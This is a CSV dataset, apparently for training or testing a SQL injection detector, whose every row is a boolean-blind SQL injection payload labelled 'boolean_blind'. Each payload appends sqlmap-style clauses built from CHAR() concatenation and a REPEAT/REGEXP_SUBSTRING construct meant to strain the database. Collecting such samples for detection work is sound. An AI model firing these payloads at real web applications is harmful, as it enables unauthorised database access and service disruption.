payload,label
"Submit||(SELECT CHAR(90)||CHAR(102)||CHAR(113)||CHAR(71) FROM DUAL WHERE 6306=6306 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))||",boolean_blind
"Submit||(SELECT CHAR(76)||CHAR(75)||CHAR(108)||CHAR(112) WHERE 4409=4409 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))||",boolean_blind
"Submit+(SELECT CHAR(102)||CHAR(112)||CHAR(77)||CHAR(84) WHERE 3822=3822 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))+",boolean_blind
"Submit')) AS fbLy WHERE 1944=1944 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- yCKP",boolean_blind
"Submit"")) AS iHHm WHERE 6400=6400 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- uQgr",boolean_blind
"Submit') AS yNUA WHERE 6816=6816 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- Ofuf",boolean_blind
"Submit"") AS BOga WHERE 2074=2074 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- uIAl",boolean_blind
"Submit' IN BOOLEAN MODE) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)#",boolean_blind
"Submit) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- NkXt",boolean_blind
"Submit) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (6251=6251",boolean_blind
"Submit)) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND ((8739=8739",boolean_blind
"Submit))) AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL) AND (((1269=1269",boolean_blind
"Submit AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)",boolean_blind
"Submit AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- ytot",boolean_blind
"Submit AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)# mSeM",boolean_blind
"Submit) WHERE 5846=5846 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- PhhK",boolean_blind
"Submit WHERE 9734=9734 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- kWMX",boolean_blind
"Submit+(SELECT rcgg WHERE 5210=5210 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL))+",boolean_blind
"Submit)) AS cjxJ WHERE 7607=7607 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- Tcfl",boolean_blind
"Submit) AS isLK WHERE 6267=6267 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- Bcrb",boolean_blind
"Submit` WHERE 7809=7809 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- woaM",boolean_blind
"Submit`) WHERE 4935=4935 AND CHAR(74)||CHAR(100)||CHAR(70)||CHAR(86)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8715),0),5000000000),NULL)-- Klax",boolean_blind
"Submit') OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- afSn",boolean_blind
"Submit' OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- seni",boolean_blind
"Submit"" OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- VYOi",boolean_blind
"Submit') OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ('GLLQ'='GLLQ",boolean_blind
"Submit')) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (('dHzK'='dHzK",boolean_blind
"Submit'))) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ((('jNla'='jNla",boolean_blind
"Submit' OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND 'tMnl'='tMnl",boolean_blind
"Submit') OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ('REMJ' LIKE 'REMJ",boolean_blind
"Submit')) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (('MStG' LIKE 'MStG",boolean_blind
"Submit'))) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ((('YEZL' LIKE 'YEZL",boolean_blind
"Submit%' OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND 'dQap%'='dQap",boolean_blind
"Submit' OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND 'WprK' LIKE 'WprK",boolean_blind
"Submit"") OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (""lDiv""=""lDiv",boolean_blind
"Submit"")) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ((""Vfiz""=""Vfiz",boolean_blind
"Submit""))) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (((""PbIv""=""PbIv",boolean_blind
"Submit"" OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ""sicL""=""sicL",boolean_blind
"Submit"") OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (""zqFC"" LIKE ""zqFC",boolean_blind
"Submit"")) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ((""tjBI"" LIKE ""tjBI",boolean_blind
"Submit""))) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (((""ckja"" LIKE ""ckja",boolean_blind
"Submit"" OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ""aqBd"" LIKE ""aqBd",boolean_blind
"Submit' OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) OR 'MyeW'='tAoR",boolean_blind
"Submit') WHERE 7494=7494 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- sbWH",boolean_blind
"Submit"") WHERE 6511=6511 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- vcVv",boolean_blind
"Submit' WHERE 3820=3820 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- nbMw",boolean_blind
"Submit"" WHERE 1749=1749 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- LvKS",boolean_blind
"Submit'||(SELECT CHAR(81)||CHAR(105)||CHAR(116)||CHAR(101) WHERE 8876=8876 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))||'",boolean_blind
"Submit'||(SELECT CHAR(98)||CHAR(73)||CHAR(89)||CHAR(102) FROM DUAL WHERE 4479=4479 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))||'",boolean_blind
"Submit'+(SELECT CHAR(70)||CHAR(116)||CHAR(67)||CHAR(75) WHERE 4285=4285 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))+'",boolean_blind
"Submit||(SELECT CHAR(78)||CHAR(106)||CHAR(67)||CHAR(73) FROM DUAL WHERE 4223=4223 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))||",boolean_blind
"Submit||(SELECT CHAR(82)||CHAR(73)||CHAR(119)||CHAR(75) WHERE 5235=5235 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))||",boolean_blind
"Submit+(SELECT CHAR(110)||CHAR(79)||CHAR(104)||CHAR(99) WHERE 3579=3579 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))+",boolean_blind
"Submit')) AS xtCH WHERE 6884=6884 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- bGVD",boolean_blind
"Submit"")) AS Dlgf WHERE 2669=2669 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- cGMA",boolean_blind
"Submit') AS JoGA WHERE 5697=5697 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- TpMb",boolean_blind
"Submit"") AS ZysT WHERE 2650=2650 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- YMWL",boolean_blind
"Submit' IN BOOLEAN MODE) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)#",boolean_blind
"Submit) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- Zenz",boolean_blind
"Submit) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (7105=7105",boolean_blind
"Submit)) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND ((8780=8780",boolean_blind
"Submit))) OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL) AND (((7386=7386",boolean_blind
"Submit OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)",boolean_blind
"Submit OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- nNcP",boolean_blind
"Submit OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)# xgwD",boolean_blind
"Submit) WHERE 8861=8861 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- tGYZ",boolean_blind
"Submit WHERE 8433=8433 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- VwmD",boolean_blind
"Submit+(SELECT kjOI WHERE 1007=1007 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL))+",boolean_blind
"Submit)) AS Xlgt WHERE 5846=5846 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- YYdD",boolean_blind
"Submit) AS TgEQ WHERE 9613=9613 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- vSzD",boolean_blind
"Submit` WHERE 7738=7738 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- gIvM",boolean_blind
"Submit`) WHERE 1770=1770 OR CHAR(107)||CHAR(75)||CHAR(112)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4271),0),5000000000),NULL)-- Bgqh",boolean_blind
"Submit') AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit' AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"" AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit')) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit'))) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit%' AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"") AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"")) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit""))) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit') WHERE 9862=9862 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"") WHERE 3407=3407 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit' WHERE 7004=7004 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"" WHERE 7561=7561 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit'||(SELECT CHAR(80)||CHAR(121)||CHAR(110)||CHAR(74) WHERE 3507=3507 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit'||(SELECT CHAR(107)||CHAR(115)||CHAR(70)||CHAR(90) FROM DUAL WHERE 7641=7641 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit'+(SELECT CHAR(119)||CHAR(108)||CHAR(119)||CHAR(69) WHERE 4815=4815 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit||(SELECT CHAR(119)||CHAR(122)||CHAR(122)||CHAR(85) FROM DUAL WHERE 1218=1218 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit||(SELECT CHAR(117)||CHAR(116)||CHAR(71)||CHAR(112) WHERE 2675=2675 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit+(SELECT CHAR(122)||CHAR(74)||CHAR(112)||CHAR(75) WHERE 4267=4267 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit')) AS pvFX WHERE 3225=3225 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"")) AS NnGw WHERE 2544=2544 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit') AS kNmF WHERE 1463=1463 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit"") AS PLJR WHERE 5346=5346 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit' IN BOOLEAN MODE) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit)) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit))) AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit) WHERE 8980=8980 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit WHERE 9344=9344 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit+(SELECT vNyl WHERE 5769=5769 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit)) AS YrUc WHERE 5012=5012 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit) AS BXLN WHERE 2890=2890 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit` WHERE 1095=1095 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit`) WHERE 3118=3118 AND CHAR(67)||CHAR(118)||CHAR(113)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4435),0),5000000000),NULL)--",boolean_blind
"Submit') OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit' OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit"" OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit')) OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit'))) OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit%' OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit"") OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit"")) OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit""))) OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit') WHERE 7601=7601 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit"") WHERE 2174=2174 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit' WHERE 3455=3455 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit"" WHERE 3627=3627 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit'||(SELECT CHAR(119)||CHAR(79)||CHAR(119)||CHAR(107) WHERE 7236=7236 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit'||(SELECT CHAR(101)||CHAR(113)||CHAR(118)||CHAR(81) FROM DUAL WHERE 4275=4275 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit'+(SELECT CHAR(78)||CHAR(121)||CHAR(111)||CHAR(119) WHERE 1649=1649 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit||(SELECT CHAR(65)||CHAR(113)||CHAR(82)||CHAR(65) FROM DUAL WHERE 5631=5631 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit||(SELECT CHAR(97)||CHAR(68)||CHAR(65)||CHAR(71) WHERE 2969=2969 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
"Submit+(SELECT CHAR(106)||CHAR(97)||CHAR(66)||CHAR(81) WHERE 7076=7076 OR CHAR(112)||CHAR(73)||CHAR(85)||CHAR(67)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7805),0),5000000000),NULL)--",boolean_blind
